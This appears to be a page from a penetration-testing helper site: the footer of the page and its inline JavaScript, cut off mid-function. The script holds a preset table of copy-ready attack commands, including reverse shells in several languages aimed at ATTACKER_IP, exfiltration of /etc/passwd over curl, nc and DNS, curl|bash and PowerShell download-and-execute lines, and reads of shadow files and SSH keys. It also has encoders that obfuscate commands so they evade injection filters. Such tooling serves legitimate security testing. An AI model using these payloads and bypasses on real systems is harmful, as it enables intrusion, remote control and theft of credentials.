                        target="_blank" class="author-link"
                        style="color: inherit; text-decoration: none; transition: color 0.2s;"
                        onmouseover="this.style.color='var(--primary-color)'"
                        onmouseout="this.style.color='inherit'">1135</a></span>
                <span style="opacity: 0.2;">|</span>
                <span class="footer-donation-icons">
                    <a href="https://buymeacoffee.com/wi11x5" target="_blank" title="Buy me a coffee"
                        class="donation-link">
                        <img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee">
                    </a>
                    <a href="https://ko-fi.com/wi11x5" target="_blank" title="Ko-fi" class="donation-link">
                        <img src="https://storage.ko-fi.com/cdn/cup-border.png" alt="Ko-fi">
                    </a>
                </span>
            </p>
        </footer>

        <!-- Floating Buttons -->
        <!-- Hint Lightbulb -->
        <div class="hint-lightbulb" onclick="toggleHint(event)" title="View Help"></div>

        <div id="back-to-top" title="Back to Top">
            <svg viewBox="0 0 24 24">
                <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path>
            </svg>
        </div>

        <!-- Scripts -->
        <script src="../../js/main.js"></script>
        <script>
            // Navigation is already loaded, just ensure language is applied
            if (typeof applyLanguage === 'function') {
                applyLanguage(localStorage.getItem('lang') || 'zh');
            }


            // -----

            // get elements - hiddened
            element_data0 = document.getElementById("data0");
            element_data1 = document.getElementById("data1");
            element_data2 = document.getElementById("data2");
            element_data3 = document.getElementById("data3");
            element_data4 = document.getElementById("data4");
            element_data5 = document.getElementById("data5");
            element_data6 = document.getElementById("data6");

            // get datas
            var data0 = element_data0.value;
            var data1 = element_data1.value;
            var data2 = element_data2.value;
            var data3 = element_data3.value;
            var data4 = element_data4.value;
            var data5 = element_data5.value;
            var data6 = element_data6.value;

            // -----

            //textareaå¢é«˜ éšå†…å®¹è‡ªåŠ¨å¢åŠ textareaçš„é«˜åº¦
            function auto_grow(element) {
                // No longer needed, using pre/code blocks
            }

            // Copy payload safely
            function copyPayload(id, btnElement) {
                const element = document.getElementById(id);
                if (!element) {
                    console.error(`Element with id "${id}" not found`);
                    return;
                }
                const text = element.textContent;
                navigator.clipboard.writeText(text).then(() => {
                    // Visual feedback
                    if (btnElement) {
                        const originalText = btnElement.textContent;
                        btnElement.textContent = 'Copied!';
                        setTimeout(() => {
                            btnElement.textContent = originalText;
                        }, 1500);
                    }
                }).catch(err => {
                    console.error('Failed to copy:', err);
                });
            }

            // Make copyPayload available globally for onclick handlers
            window.copyPayload = copyPayload;

            // -----
            // Preset Commands Data & Functions
            const PRESET_COMMANDS = {
                'Test Commands (Complex)': [
                    { name: 'ğŸ§ª netstat + grep + awk + sort + uniq', cmd: `netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr` },
                    { name: 'ğŸ§ª find + xargs + grep', cmd: `find /etc -type f -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null` },
                    { name: 'ğŸ§ª ps + awk + sort', cmd: `ps aux | awk '{print $1, $2, $11}' | sort -k1` },
                    { name: 'ğŸ§ª cat + base64 + curl', cmd: `cat /etc/passwd | base64 -w0 | curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d @- http://ATTACKER_IP:8000/` },
                    { name: 'ğŸ§ª ls + while + echo', cmd: `ls -la /tmp | while read line; do echo "[FILE] $line"; done` },
                    { name: 'ğŸ§ª for loop + ping', cmd: `for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i | grep "64 bytes" & done` }
                ],
                'Reverse Shell': [
                    { name: 'Bash TCP Reverse Shell', cmd: `/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` },
                    { name: 'Bash -c Reverse Shell', cmd: `bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"` },
                    { name: 'Netcat -e Reverse Shell', cmd: `nc -e /bin/sh ATTACKER_IP 4444` },
                    { name: 'Netcat mkfifo', cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f` },
                    { name: 'Python Reverse Shell', cmd: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
                    { name: 'Perl Reverse Shell', cmd: `perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
                    { name: 'PHP Reverse Shell', cmd: `php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` },
                    { name: 'Ruby Reverse Shell', cmd: `ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` }
                ],
                'Information Gathering': [
                    { name: 'Basic Info', cmd: `id && whoami && hostname` },
                    { name: 'Read /etc/passwd', cmd: `cat /etc/passwd` },
                    { name: 'Read /etc/shadow', cmd: `cat /etc/shadow` },
                    { name: 'OS Information', cmd: `uname -a && cat /etc/os-release` },
                    { name: 'Environment Variables', cmd: `env && printenv` },
                    { name: 'Process List', cmd: `ps aux` },
                    { name: 'Crontab', cmd: `crontab -l && cat /etc/crontab` },
                    { name: 'SSH Keys', cmd: `cat ~/.ssh/id_rsa && cat ~/.ssh/authorized_keys` }
                ],
                'Network': [
                    { name: 'Active Connections (sorted)', cmd: `netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr` },
                    { name: 'Listening Ports', cmd: `netstat -tulpn` },
                    { name: 'Socket Statistics', cmd: `ss -tulpn` },
                    { name: 'Network Interfaces', cmd: `ifconfig -a || ip addr` },
                    { name: 'ARP Table', cmd: `arp -a` },
                    { name: 'External IP', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" ifconfig.me` },
                    { name: 'DNS Servers', cmd: `cat /etc/resolv.conf` },
                    { name: 'Routing Table', cmd: `route -n || ip route` },
                    { name: 'Firewall Rules', cmd: `iptables -L -n || ufw status` }
                ],
                'HTTP Requests (curl/wget)': [
                    { name: 'ğŸŒ curl GET (ç®€å•)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://example.webhook.cool/` },
                    { name: 'ğŸŒ curl GET -k -v (å¿½ç•¥SSL+è¯¦ç»†)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -k -v https://example.webhook.cool/` },
                    { name: 'ğŸŒ curl GET å¸¦Header', cmd: `curl -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -H "Cookie: session=abc123" https://example.webhook.cool/` },
                    { name: 'ğŸŒ curl POST (form data)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d "username=admin&password=123456" https://example.webhook.cool/login` },
                    { name: 'ğŸŒ curl POST (JSON)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -H "Content-Type: application/json" -d '{"user":"admin","pass":"123"}' https://example.webhook.cool/api` },
                    { name: 'ğŸŒ curl POST æ–‡ä»¶å†…å®¹', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d @/etc/passwd https://example.webhook.cool/exfil` },
                    { name: 'ğŸŒ curl POST base64ç¼–ç ', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d "data=$(cat /etc/passwd | base64 -w0)" https://example.webhook.cool/exfil` },
                    { name: 'ğŸŒ curl -k POST (å¿½ç•¥SSL)', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -k -X POST -d "data=test" https://example.webhook.cool/` },
                    { name: 'ğŸŒ wget GET (ä¿å­˜æ–‡ä»¶)', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://example.webhook.cool/malware.sh -O /tmp/payload.sh` },
                    { name: 'ğŸŒ wget GET (è¾“å‡ºåˆ°stdout)', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -qO- https://example.webhook.cool/` },
                    { name: 'ğŸŒ wget --no-check-certificate', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --no-check-certificate https://example.webhook.cool/` },
                    { name: 'ğŸŒ wget POST', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --post-data="user=admin&pass=123" https://example.webhook.cool/login` },
                    { name: 'ğŸŒ curl ä¸‹è½½æ‰§è¡Œ', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://ATTACKER_IP/shell.sh | bash` },
                    { name: 'ğŸŒ wget ä¸‹è½½æ‰§è¡Œ', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -qO- https://ATTACKER_IP/shell.sh | bash` }
                ],
                'File Operations': [
                    { name: 'Find SUID Files', cmd: `find / -perm -4000 2>/dev/null` },
                    { name: 'Find SGID Files', cmd: `find / -perm -2000 2>/dev/null` },
                    { name: 'Find Writable Dirs', cmd: `find / -writable -type d 2>/dev/null` },
                    { name: 'Find World Writable', cmd: `find / -perm -o+w -type f 2>/dev/null` },
                    { name: 'List Temp Dirs', cmd: `ls -la /tmp /var/tmp /dev/shm` },
                    { name: 'Bash History', cmd: `cat ~/.bash_history` },
                    { name: 'Find Config Files', cmd: `find /etc -name "*.conf" 2>/dev/null | head -20` },
                    { name: 'Find Log Files', cmd: `find /var/log -type f 2>/dev/null | head -20` }
                ],
                'Data Exfiltration': [
                    { name: 'Curl POST File', cmd: `curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -X POST -d @/etc/passwd http://ATTACKER_IP:8000/` },
                    { name: 'Wget POST File', cmd: `wget -U "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --post-file=/etc/passwd http://ATTACKER_IP:8000/` },
                    { name: 'Base64 + Curl', cmd: `cat /etc/passwd | base64 | curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -d @- http://ATTACKER_IP:8000/` },
                    { name: 'NC File Transfer', cmd: `cat /etc/passwd | nc ATTACKER_IP 4444` },
                    { name: 'DNS Exfil (base64)', cmd: `cat /etc/passwd | base64 | tr -d "\\n" | xargs -I {} dig {}.ATTACKER_DOMAIN` }
                ],
                'Privilege Escalation': [
                    { name: 'Sudo -l', cmd: `sudo -l` },
                    { name: 'Check Capabilities', cmd: `getcap -r / 2>/dev/null` },
                    { name: 'Check /etc/sudoers', cmd: `cat /etc/sudoers 2>/dev/null` },
                    { name: 'Find Passwords', cmd: `grep -r "password" /etc 2>/dev/null | head -20` },
                    { name: 'Check Docker', cmd: `docker ps && docker images` },
                    { name: 'Check LXC', cmd: `lxc list` }
                ],
                'Windows': [
                    { name: 'whoami /all', cmd: `whoami /all` },
                    { name: 'System Info', cmd: `systeminfo` },
                    { name: 'List Users', cmd: `net user` },
                    { name: 'Network Connections', cmd: `netstat -ano` },
                    { name: 'PowerShell Download', cmd: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"` },
                    { name: 'PowerShell Encoded', cmd: `powershell -EncodedCommand BASE64_PAYLOAD` },
                    { name: 'WMIC Process', cmd: `wmic process list brief` },
                    { name: 'Scheduled Tasks', cmd: `schtasks /query /fo LIST /v` }
                ]
            };

            // Flatten commands into indexed array for reliable access
            const PRESET_COMMANDS_FLAT = [];
            (function () {
                for (const [category, commands] of Object.entries(PRESET_COMMANDS)) {
                    for (const item of commands) {
                        PRESET_COMMANDS_FLAT.push({ category, name: item.name, cmd: item.cmd });
                    }
                }
            })();

            function buildPresetMenu() {
                const menu = document.getElementById('preset-menu');
                if (!menu) return;

                // Group by category for display
                const categories = {};
                PRESET_COMMANDS_FLAT.forEach((item, idx) => {
                    if (!categories[item.category]) {
                        categories[item.category] = [];
                    }
                    categories[item.category].push({ ...item, idx });
                });

                // Build menu using DOM methods (safer than innerHTML for special chars)
                menu.innerHTML = '';
                for (const [category, items] of Object.entries(categories)) {
                    const categoryDiv = document.createElement('div');
                    categoryDiv.className = 'preset-category';

                    const strong = document.createElement('strong');
                    strong.textContent = category;
                    categoryDiv.appendChild(strong);

                    for (const item of items) {
                        const itemDiv = document.createElement('div');
                        itemDiv.className = 'preset-item';
                        itemDiv.textContent = item.name;
                        itemDiv.dataset.idx = item.idx;

                        // Use closure to capture the correct index
                        itemDiv.addEventListener('click', (function (index) {
                            return function () {
                                selectPresetByIndex(index);
                            };
                        })(item.idx));

                        categoryDiv.appendChild(itemDiv);
                    }

                    menu.appendChild(categoryDiv);
                }
            }

            function selectPresetByIndex(idx) {
                const item = PRESET_COMMANDS_FLAT[idx];
                if (item) {
                    selectPreset(item.cmd);
                }
            }

            function togglePresetMenu() {
                const menu = document.getElementById('preset-menu');
                if (menu.style.display === 'none') {
                    menu.style.display = 'block';
                } else {
                    menu.style.display = 'none';
                }
            }

            function selectPreset(cmd) {
                const input = document.getElementById('your_cmd');
                input.value = cmd;
                document.getElementById('preset-menu').style.display = 'none';
                func_oninput();
                input.focus();
            }

            // Close preset menu when clicking outside
            document.addEventListener('click', function (e) {
                const menu = document.getElementById('preset-menu');
                const btn = document.querySelector('.preset-btn');
                if (menu && btn && !menu.contains(e.target) && !btn.contains(e.target)) {
                    menu.style.display = 'none';
                }
            });

            // Build preset menu on load
            document.addEventListener('DOMContentLoaded', buildPresetMenu);

            // Make functions available globally
            window.togglePresetMenu = togglePresetMenu;
            window.selectPreset = selectPreset;

            // -----


            function ascii_2_Hex(str) {
                var re = /[\u4E00-\u9FA5]/;
                var ar = [];
                for (var i = 0; i < str.length; i++) {
                    var a = '';
                    if (re.test(str.charAt(i))) { // ä¸­æ–‡
                        a = encodeURI(str.charAt(i)).replace(/%/g, '');
                    } else {
                        a = "\\x" + str.charCodeAt(i).toString(16);
                    }
                    ar.push(a);
                }
                str = ar.join("");
                return str;
            }

            // Full hex encoding - encode EVERYTHING including | & ; etc.
            // This is the correct way to hex encode commands with shell operators
            function ascii_2_Hex_full(str) {
                var ar = [];
                for (var i = 0; i < str.length; i++) {
                    ar.push("\\x" + str.charCodeAt(i).toString(16).padStart(2, '0'));
                }
                return ar.join("");
            }

            function ascii_2_Hex_without_black_chars(str) {
                var regex_black_chars = /([<>|&;])/g;
                var str_array = str.split(regex_black_chars);
                // æ’é™¤ black_chars å¦‚æœå‘½ä»¤é‡Œæœ‰è¿™äº›å­—ç¬¦,hexç¼–ç åçš„å‘½ä»¤æ— æ³•æ‰§è¡Œ!

                var allstr = "";
                str_array.forEach(
                    function (one) {
                        if (one.match(regex_black_chars) && one != "") {
                            one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& æ˜¯è¢«åŒ¹é…çš„å­—ç¬¦ä¸²æœ¬èº«
                        } else {
                            one = ascii_2_Hex(one);
                        }
                        allstr += one;
                    }
                );

                return allstr.replace(/`echo -e ""`/g, "").replace(/`echo -e "\x20"`/g, " "); // å»é™¤æ— æ„ä¹‰çš„å­—ç¬¦
            }

            // ç”Ÿæˆä¸å¸¦=çš„base64å­—ç¬¦ä¸²
            function func_wise_btoa(str1) {
                //åŸç†:åœ¨åŸå§‹jsè¯­å¥ååŠ ç©ºæ ¼ ç›´åˆ°ç”Ÿæˆçš„base64å­—ç¬¦ä¸²æ²¡æœ‰ç©ºæ ¼
                while (1) {
                    if (btoa(str1).indexOf("=") == -1) {//  ç­‰å·ä¸å­˜åœ¨
                        return btoa(str1);
                    } else {
                        str1 = str1 + " ";
                    }

                }
            }

            // PowerShell UTF-16LE Base64 encoding (for -EncodedCommand)
            function powershellBase64(str) {
                // Convert string to UTF-16LE (Little Endian)
                const utf16le = [];
                for (let i = 0; i < str.length; i++) {
                    const charCode = str.charCodeAt(i);
                    utf16le.push(charCode & 0xFF);        // Low byte
                    utf16le.push((charCode >> 8) & 0xFF); // High byte
                }
                // Convert to base64
                const binary = String.fromCharCode.apply(null, utf16le);
                return btoa(binary);
            }

            // ========== Filter Bypass Functions (Based on PayloadsAllTheThings) ==========

            // Common Linux/Unix command names to detect and process
            const LINUX_COMMANDS = new Set([
                // File operations
                'cat', 'ls', 'cp', 'mv', 'rm', 'mkdir', 'rmdir', 'touch', 'chmod', 'chown', 'find', 'locate',
                'head', 'tail', 'less', 'more', 'wc', 'diff', 'file', 'stat', 'ln', 'readlink', 'basename', 'dirname',
                // Text processing
                'grep', 'egrep', 'fgrep', 'sed', 'awk', 'gawk', 'cut', 'sort', 'uniq', 'tr', 'tee', 'xargs',
                'strings', 'od', 'hexdump', 'xxd', 'base64', 'rev', 'nl', 'paste', 'join', 'comm', 'expand',
                // Network
                'netstat', 'ss', 'ifconfig', 'ip', 'ping', 'traceroute', 'nslookup', 'dig', 'host', 'arp',
                'curl', 'wget', 'nc', 'netcat', 'ncat', 'socat', 'telnet', 'ssh', 'scp', 'rsync', 'ftp', 'sftp',
                // Process/System
                'ps', 'top', 'htop', 'kill', 'killall', 'pkill', 'pgrep', 'nice', 'nohup', 'bg', 'fg', 'jobs',
                'id', 'whoami', 'who', 'w', 'users', 'groups', 'last', 'lastlog', 'finger', 'su', 'sudo',
                'uname', 'hostname', 'uptime', 'dmesg', 'lsof', 'strace', 'ltrace', 'free', 'vmstat', 'iostat',
                // Shells
                'bash', 'sh', 'zsh', 'csh', 'tcsh', 'ksh', 'dash', 'fish',
                // Package managers
                'apt', 'yum', 'dnf', 'pacman', 'brew', 'pip', 'npm', 'gem', 'cargo',
                // Compression
                'tar', 'gzip', 'gunzip', 'bzip2', 'xz', 'zip', 'unzip', 'rar', 'unrar', '7z',
                // Editors/Viewers
                'vi', 'vim', 'nano', 'emacs', 'ed', 'view',
                // Scripting
                'python', 'python3', 'perl', 'ruby', 'php', 'node', 'lua', 'awk',
                // Misc
                'echo', 'printf', 'env', 'printenv', 'export', 'set', 'unset', 'alias', 'type', 'which', 'whereis',
                'date', 'cal', 'sleep', 'watch', 'timeout', 'time', 'yes', 'true', 'false', 'test', 'expr',
                'eval', 'exec', 'source', 'xdg-open', 'open', 'systemctl', 'service', 'journalctl',
                // Security/Hacking
                'nmap', 'masscan', 'nikto', 'sqlmap', 'hydra', 'john', 'hashcat', 'gobuster', 'dirb', 'ffuf',
                'msfconsole', 'msfvenom', 'metasploit', 'burpsuite', 'wireshark', 'tcpdump', 'tshark'
            ]);

            // Shell keywords/reserved words - CANNOT be bypassed with quotes/backslashes!
            // These are part of shell syntax, not external commands
            const SHELL_KEYWORDS = new Set([
                // Control flow
                'if', 'then', 'else', 'elif', 'fi',
                'case', 'esac',
                'for', 'while', 'until', 'do', 'done',
                'select', 'in',
                // Functions and blocks
                'function', 'time', 'coproc',
                // Logic
                '!', '[[', ']]', '{', '}',
                // Job control (some are builtins but act like keywords)
                'break', 'continue', 'return',
                // Special
                'local', 'declare', 'typeset', 'readonly',
                // Zsh specific
                'foreach', 'end', 'repeat'
            ]);

            // Check if a word is a shell keyword (cannot be bypassed)
            function isShellKeyword(word) {
                return SHELL_KEYWORDS.has(word.toLowerCase());
            }

            // Check if a word is a Linux command (not just any text)
            function isCommand(word) {
                // Shell keywords cannot be treated as commands for bypass purposes
                if (isShellKeyword(word)) return false;
                // Remove leading path like /bin/, /usr/bin/, etc.
                const baseName = word.replace(/^(\/[a-z]+)+\//i, '');
                return LINUX_COMMANDS.has(baseName.toLowerCase());
            }

            // Tokenize command string preserving structure (pipes, redirects, etc.)
            function tokenizeCommand(str) {
                // Split by shell operators while preserving them
                const tokens = [];
                let current = '';
                let i = 0;

                while (i < str.length) {
                    const char = str[i];
                    const nextChar = str[i + 1] || '';

                    // Check for multi-char operators
                    if ((char === '|' && nextChar === '|') ||
                        (char === '&' && nextChar === '&') ||
                        (char === '>' && nextChar === '>') ||
                        (char === '<' && nextChar === '<') ||
                        (char === '>' && nextChar === '&') ||
                        (char === '2' && nextChar === '>')) {
                        if (current.trim()) tokens.push({ type: 'text', value: current });
                        current = '';
                        tokens.push({ type: 'operator', value: char + nextChar });
                        i += 2;
                        continue;
                    }

                    // Single char operators
                    if ('|;&><'.includes(char)) {
                        if (current.trim()) tokens.push({ type: 'text', value: current });
                        current = '';
                        tokens.push({ type: 'operator', value: char });
                        i++;
                        continue;
                    }

                    current += char;
                    i++;
                }

                if (current.trim()) tokens.push({ type: 'text', value: current });
                return tokens;
            }

            // Apply bypass to a single command word
            function applyBypassToWord(word, bypassFn) {
                if (word.length < 2) return word;
                return bypassFn(word);
            }

            // Process a command segment (between operators), applying bypass to command names
            function processCommandSegment(segment, bypassFn) {
                const trimmed = segment.trim();
                if (!trimmed) return segment;

                // Split into words
                const words = trimmed.split(/(\s+)/);
                let foundFirstCommand = false;

                const processed = words.map((word, idx) => {
                    // Skip whitespace
                    if (/^\s+$/.test(word)) return word;

                    // Skip empty
                    if (!word) return word;

                    // CRITICAL: Skip shell keywords - they CANNOT be bypassed with quotes!
                    // while, do, done, if, then, fi, for, etc. are shell syntax, not commands
                    if (isShellKeyword(word)) return word;

                    // Skip options (start with -)
                    if (word.startsWith('-')) return word;

                    // Skip paths that are arguments (contain / but not at start or are clearly file paths)
                    if (word.includes('/') && !word.startsWith('/bin') && !word.startsWith('/usr') && !word.startsWith('/sbin')) {
                        // Check if it's a file path argument (like /etc/passwd)
                        if (!isCommand(word)) return word;
                    }

                    // Skip quoted strings
                    if (word.startsWith('"') || word.startsWith("'") || word.startsWith('`')) return word;

                    // Skip variable references
                    if (word.startsWith('$')) return word;

                    // Check if this word is a command
                    if (isCommand(word)) {
                        foundFirstCommand = true;
                        return applyBypassToWord(word, bypassFn);
                    }

                    // If we haven't found a command yet, this might be the command
                    // (handles cases like custom scripts)
                    // But NOT if it's a shell keyword!
                    if (!foundFirstCommand && idx === 0 && !isShellKeyword(word)) {
                        foundFirstCommand = true;
                        return applyBypassToWord(word, bypassFn);
                    }

                    return word;
                });

                return processed.join('');
            }

            // Main function: Apply bypass to all commands in a complex command string
            function applyBypassToAllCommands(str, bypassFn) {
                const tokens = tokenizeCommand(str);
                return tokens.map(token => {
                    if (token.type === 'operator') return token.value;
                    return processCommandSegment(token.value, bypassFn);
                }).join('');
            }

            // ========== Individual Bypass Strategies ==========

            // Single Quote: wh''oami
            function singleQuoteEmpty(word) {
                const mid = Math.floor(word.length / 2);
                return word.slice(0, mid) + "''" + word.slice(mid);
            }

            // Single Quote: 'wh'oami
            function singleQuoteWrapStart(word) {
                const mid = Math.floor(word.length / 2);
                return "'" + word.slice(0, mid) + "'" + word.slice(mid);
            }

            // Single Quote: w'ho'ami
            function singleQuoteWrapMid(word) {
                if (word.length < 3) return word;
                const start = Math.floor(word.length / 3);
                const end = Math.floor(word.length * 2 / 3);
                return word.slice(0, start) + "'" + word.slice(start, end) + "'" + word.slice(end);
            }

            // Double Quote: wh""oami
            function doubleQuoteEmpty(word) {
                const mid = Math.floor(word.length / 2);
                return word.slice(0, mid) + '""' + word.slice(mid);
            }

            // Double Quote: "wh"oami
            function doubleQuoteWrapStart(word) {
                const mid = Math.floor(word.length / 2);
                return '"' + word.slice(0, mid) + '"' + word.slice(mid);
            }

            // Double Quote: w"ho"ami
            function doubleQuoteWrapMid(word) {
                if (word.length < 3) return word;
                const start = Math.floor(word.length / 3);
                const end = Math.floor(word.length * 2 / 3);
                return word.slice(0, start) + '"' + word.slice(start, end) + '"' + word.slice(end);
            }

            // Backslash: w\hoami
            function backslashSingle(word) {
                return word[0] + '\\' + word.slice(1);
            }

            // Backslash: w\h\o\a\m\i
            function backslashAll(word) {
                let result = word[0];
                for (let i = 1; i < word.length; i++) {
                    result += '\\' + word[i];
                }
                return result;
            }

            // Backtick: wh``oami
            function backtickEmpty(word) {
                const mid = Math.floor(word.length / 2);
                return word.slice(0, mid) + '``' + word.slice(mid);
            }

            // $@: who$@ami
            function dollarAt(word) {
                const mid = Math.floor(word.length / 2);
                return word.slice(0, mid) + '$@' + word.slice(mid);
            }

            // $(): who$()ami
            function dollarParen(word) {
                const mid = Math.floor(word.length / 2);
                return word.slice(0, mid) + '$()' + word.slice(mid);
            }

            // ${x}: who${x}ami
            function dollarVar(word) {
                const mid = Math.floor(word.length / 2);
                return word.slice(0, mid) + '${x}' + word.slice(mid);
            }

            // ========== Wrapper Functions for Full Command Processing ==========

            function bypassSingleQuoteEmpty(str) {
                return applyBypassToAllCommands(str, singleQuoteEmpty);
            }

            function bypassSingleQuoteWrapStart(str) {
                return applyBypassToAllCommands(str, singleQuoteWrapStart);
            }

            function bypassSingleQuoteWrapMid(str) {
                return applyBypassToAllCommands(str, singleQuoteWrapMid);
            }

            function bypassDoubleQuoteEmpty(str) {
                return applyBypassToAllCommands(str, doubleQuoteEmpty);
            }

            function bypassDoubleQuoteWrapStart(str) {
                return applyBypassToAllCommands(str, doubleQuoteWrapStart);
            }

            function bypassDoubleQuoteWrapMid(str) {
                return applyBypassToAllCommands(str, doubleQuoteWrapMid);
            }

            function bypassBackslashSingle(str) {
                return applyBypassToAllCommands(str, backslashSingle);
            }

            function bypassBackslashAll(str) {
                return applyBypassToAllCommands(str, backslashAll);
            }

            function bypassBacktickEmpty(str) {
                return applyBypassToAllCommands(str, backtickEmpty);
            }

            function bypassDollarAt(str) {
                return applyBypassToAllCommands(str, dollarAt);
            }

            function bypassDollarParen(str) {
                return applyBypassToAllCommands(str, dollarParen);
            }

            function bypassDollarVar(str) {
                return applyBypassToAllCommands(str, dollarVar);
            }

            // ${IFS} - Replace spaces (Bash only, not zsh)
            // IMPORTANT: Cannot replace spaces inside quoted strings (awk, sed, etc.)
            function bypassIFS(str) {
                return replaceSpacesOutsideQuotes(str, '${IFS}');
            }

            // $IFS - Shorter version (Bash only)
            function bypassIFSShort(str) {
                return replaceSpacesOutsideQuotes(str, '$IFS');
            }

            // Helper: Replace spaces only outside of single/double quotes
            // This is critical because ${IFS} doesn't work inside awk '{print $5}' etc.
            function replaceSpacesOutsideQuotes(str, replacement) {
                let result = '';
                let inSingleQuote = false;
                let inDoubleQuote = false;

                for (let i = 0; i < str.length; i++) {
                    const char = str[i];
                    const prevChar = str[i - 1] || '';

                    // Track quote state (ignore escaped quotes)
                    if (char === "'" && prevChar !== '\\' && !inDoubleQuote) {
                        inSingleQuote = !inSingleQuote;
                        result += char;
                    } else if (char === '"' && prevChar !== '\\' && !inSingleQuote) {
                        inDoubleQuote = !inDoubleQuote;
                        result += char;
                    } else if (char === ' ' && !inSingleQuote && !inDoubleQuote) {
                        // Replace space only when outside quotes
                        result += replacement;
                    } else {
                        result += char;
                    }
                }

                return result;
            }

            // Brace Expansion: {cat,/etc/passwd}
            function bypassBraceExpansion(str) {
                const parts = str.split(' ');
                if (parts.length < 2) return '{,' + str + ',}';
                return '{' + parts.join(',') + '}';
            }

            // Tab (%09) - Replace spaces with tabs (URL encoded)
            // Tab (%09) - Replace spaces with tabs (URL encoded)
            // Also needs to skip quoted strings
            function bypassTab(str) {
                return replaceSpacesOutsideQuotes(str, '%09');
            }

            // Input Redirection: cat</etc/passwd
            // ONLY works for commands that read from stdin with a file path as the LAST argument
            // Does NOT work for replacing spaces between command and flags (e.g., ls -la)
            function bypassInputRedirect(str) {
                const parts = str.split(' ');
                // Only apply if: command + file path (2 parts) or command + pattern + file (like grep root /etc/passwd)
                if (parts.length === 2 && parts[1].startsWith('/')) {
                    // Simple case: cat /etc/passwd â†’ cat</etc/passwd
                    return parts[0] + '<' + parts[1];
                } else if (parts.length >= 2) {
                    // Check if last part is a file path
                    const lastPart = parts[parts.length - 1];
                    if (lastPart.startsWith('/')) {
                        // grep root /etc/passwd â†’ grep root</etc/passwd
                        return parts.slice(0, -1).join(' ') + '<' + lastPart;
                    }
                }
                // Not applicable - return original with note
                return str + '  # (< é‡å®šå‘ä¸é€‚ç”¨äºæ­¤å‘½ä»¤)';
            }

            // Hex encoding with echo -e
            // Hex encoding with echo -e, piped to bash for proper execution
            // IMPORTANT: Simple backtick execution doesn't work for commands with && || ; etc.
            // because the shell treats the output as a single command string, not parsed shell syntax
            function bypassHexEcho(str) {
                let hex = '';
